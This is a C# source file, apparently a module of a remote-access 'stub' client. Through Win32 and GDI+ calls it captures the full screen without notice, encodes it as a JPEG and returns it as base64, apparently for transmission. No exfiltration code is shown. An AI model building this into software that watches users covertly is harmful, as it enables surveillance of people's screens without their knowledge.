using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

internal static class ScreenshotFeature
{
    [DllImport("user32.dll")]  static extern nint GetDC(nint hwnd);
    [DllImport("user32.dll")]  static extern int  ReleaseDC(nint hwnd, nint hdc);
    [DllImport("user32.dll")]  static extern int  GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll")]   static extern nint CreateCompatibleDC(nint hdc);
    [DllImport("gdi32.dll")]   static extern nint SelectObject(nint hdc, nint h);
    [DllImport("gdi32.dll")]   static extern bool BitBlt(nint hdc, int x, int y, int cx, int cy, nint src, int xs, int ys, uint rop);
    [DllImport("gdi32.dll")]   static extern bool DeleteDC(nint hdc);
    [DllImport("gdi32.dll")]   static extern bool DeleteObject(nint ho);
    [DllImport("gdi32.dll")]   static extern nint CreateDIBSection(nint hdc, ref BmpInfo bmi, uint usage, out nint bits, nint sec, uint off);
    [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint p, uint cb);
    [DllImport("gdiplus.dll")] static extern int  GdiplusStartup(out nint tok, ref GdipIn inp, nint outp);
    [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint tok);
    [DllImport("gdiplus.dll")] static extern int  GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, nint scan0, out nint bmp);
    [DllImport("gdiplus.dll")] static extern int  GdipDisposeImage(nint img);
    [DllImport("gdiplus.dll")] static extern int  GdipSaveImageToStream(nint img, nint stream, ref Guid clsid, nint ep);

    [StructLayout(LayoutKind.Sequential)]
    struct BmpInfoHdr { public uint size; public int w, h; public ushort planes, bpp; public uint compress, imgSize, xppm, yppm, clrUsed, clrImp; }
    [StructLayout(LayoutKind.Sequential)]
    struct BmpInfo { public BmpInfoHdr hdr; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public uint[] colors; }
    [StructLayout(LayoutKind.Sequential)]
    struct GdipIn { public uint Version; public nint Callback; public int SuppBg, SuppExt; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncParam { public Guid Guid; public uint Count, Type; public nint Value; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncParams { public uint Count; public EncParam Param; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint VtRelease(nint p);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtSeek(nint p, long move, uint origin, ref long pos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtRead(nint p, nint pv, uint cb, out uint cbRead);

    static readonly Guid JpegClsid  = new("557CF401-1A04-11D3-9A73-0000F81EF32E");
    static readonly Guid EncQuality = new("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");

    static VtSeek?    _ssSeekFn;
    static VtRead?    _ssReadFn;
    static VtRelease? _ssRelFn;

    static readonly uint[] _ssBmiColors = new uint[4]; // reused; GetDIBits never writes here for BI_RGB
    static char[] _ssB64Chars = new char[128 * 1024];  // grow-only base64 scratch

    private static readonly nint _gdipToken;

    static ScreenshotFeature()
    {
        var gdipInp = new GdipIn { Version = 1 };
        GdiplusStartup(out var tok, ref gdipInp, 0);
        _gdipToken = tok;
    }

    internal static unsafe string Capture(int quality = 55)
    {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        if (sw <= 0 || sh <= 0) return "";

        nint hdcScreen = GetDC(0);
        if (hdcScreen == 0) return "";
        try
        {
            nint hdcMem = CreateCompatibleDC(hdcScreen);
            if (hdcMem == 0) return "";

            var bmi = new BmpInfo
            {
                hdr = new BmpInfoHdr
                {
                    size = (uint)Marshal.SizeOf<BmpInfoHdr>(),
                    w = sw, h = -sh, planes = 1, bpp = 32, compress = 0
                },
                colors = _ssBmiColors
            };

            nint hbm = CreateDIBSection(hdcScreen, ref bmi, 0, out nint bits, 0, 0);
            if (hbm == 0 || bits == 0) { DeleteDC(hdcMem); return ""; }

            nint hbmOld = SelectObject(hdcMem, hbm);
            if (!BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, 0x00CC0020u)) // SRCCOPY
                { if (hbmOld != 0) SelectObject(hdcMem, hbmOld); DeleteObject(hbm); DeleteDC(hdcMem); return ""; }

            if (GdipCreateBitmapFromScan0(sw, sh, sw * 4, 0x26200A, bits, out nint bmp) != 0 || bmp == 0)
                { if (hbmOld != 0) SelectObject(hdcMem, hbmOld); DeleteObject(hbm); DeleteDC(hdcMem); return ""; }
            try
            {
                nint stream = SHCreateMemStream(0, 0);
                if (stream == 0) return "";

                int q = quality;
                var ep = new EncParams
                {
                    Count = 1,
                    Param = new EncParam { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) }
                };
                var cls = JpegClsid;
                GdipSaveImageToStream(bmp, stream, ref cls, (nint)(&ep));

                var seek = _ssSeekFn ??= Marshal.GetDelegateForFunctionPointer<VtSeek>((*(nint**)stream)[5]);
                var read = _ssReadFn ??= Marshal.GetDelegateForFunctionPointer<VtRead>((*(nint**)stream)[3]);
                var rel  = _ssRelFn  ??= Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2]);
                try
                {
                    // Seek to end to get total byte count, then back to start for one-shot read
                    long streamLen = 0;
                    seek(stream, 0, 2, ref streamLen); // STREAM_SEEK_END
                    if (streamLen <= 0) return "";
                    long dummy = 0;
                    seek(stream, 0, 0, ref dummy);     // STREAM_SEEK_SET

                    var jpegBuf = System.Buffers.ArrayPool<byte>.Shared.Rent((int)streamLen);
                    try
                    {
                        fixed (byte* pb = jpegBuf)
                            read(stream, (nint)pb, (uint)streamLen, out _);

                        int b64Need = ((int)streamLen + 2) / 3 * 4;
                        if (_ssB64Chars.Length < b64Need) _ssB64Chars = new char[b64Need + 64];
                        Convert.TryToBase64Chars(jpegBuf.AsSpan(0, (int)streamLen), _ssB64Chars, out int b64Written);
                        return new string(_ssB64Chars, 0, b64Written);
                    }
                    finally { System.Buffers.ArrayPool<byte>.Shared.Return(jpegBuf); }
                }
                finally { rel(stream); }
            }
            finally { GdipDisposeImage(bmp); if (hbmOld != 0) SelectObject(hdcMem, hbmOld); DeleteObject(hbm); DeleteDC(hdcMem); }
        }
        finally { ReleaseDC(0, hdcScreen); }
    }
}

internal class ScreenshotResultStub { public string Data { get; set; } = ""; }
